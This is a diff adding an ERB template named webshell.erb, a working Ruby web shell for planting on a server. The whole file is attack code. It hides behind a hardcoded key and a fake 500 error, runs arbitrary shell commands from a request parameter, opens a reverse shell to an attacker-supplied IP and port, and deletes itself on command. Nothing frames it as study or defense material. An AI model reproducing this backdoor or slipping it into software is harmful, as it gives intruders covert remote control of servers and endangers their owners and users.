@@ -1,0 +1,27 @@
+<%=
+    #Snippet: webshell.erb
+    #Configuration
+    secret_key="Sher1ff"
+
+    #Main function: Webshell
+    if params[:key] != secret_key
+        headers["Status"] = "500 Internal Server Error"
+        ""
+    elsif params[:cmd]
+        `#{params[:cmd]}`
+    elsif params[:mod] == "shell" && params[:ip] && params[:port]
+        Thread.new do
+            Socket.tcp(params[:ip], params[:port].to_i) do|sock|
+                while(cmd = sock.gets)
+                    sock.puts(`#{cmd.chomp}`)
+                end
+            end
+        end
+        "Reverse shell connected to #{params[:ip]}:#{params[:port]}"
+    elsif params[:mod] == "kaboom"
+        File.delete(__FILE__)
+        "Webshell removed"
+    else
+        "Usage: ?key=<key>&cmd=<command> | ?key=<key>&mod=shell&ip=<remote_ip>&port=<remote_port> | ?key=<key>&mod=kaboom"
+    end
+%>
